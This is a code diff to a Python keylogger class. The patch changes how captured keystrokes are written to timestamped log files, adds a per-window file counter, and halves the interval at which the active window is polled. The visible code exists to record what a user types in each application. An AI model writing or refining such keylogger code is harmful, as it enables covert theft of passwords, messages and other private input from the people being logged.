@@ -44,18 +44,17 @@ class Keylogger:
     
     def write_keylogs_to_file(self, foreground_window):
         if self.log:
-
             with open(f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt", "w", encoding="utf-8") as file:
                 file.write((
                         f"Foreground Window: {foreground_window}\n"
                         f"Starttime: {self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
                         f"Endtime: {self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
+                        f"Filecounter: {self.filecounter}\n"
                         f"------------------------\n\n"
                         f"{self.log}"
                     ))
 
             self.start_time = datetime.now()
-            self.filecounter += 1
         self.log = ""
 
     def check_foreground_window(self):
@@ -66,9 +65,11 @@ class Keylogger:
             if current_window != self.foreground_window:
                 self.write_keylogs_to_file(self.foreground_window)
                 self.foreground_window = current_window
+                self.filecounter = 0
 
             elif (self.end_time - self.start_time) >= timedelta(seconds=self.log_interval):
                 self.write_keylogs_to_file(current_window)
+                self.filecounter += 1
                 
             time.sleep(self.window_interval)
 
@@ -105,5 +106,5 @@ class Keylogger:
                     print(recv)
 
 if __name__ == "__main__":
-    keylogger = Keylogger(log_interval=15, window_interval=0.5)
+    keylogger = Keylogger(log_interval=15, window_interval=0.25)
     keylogger.start()
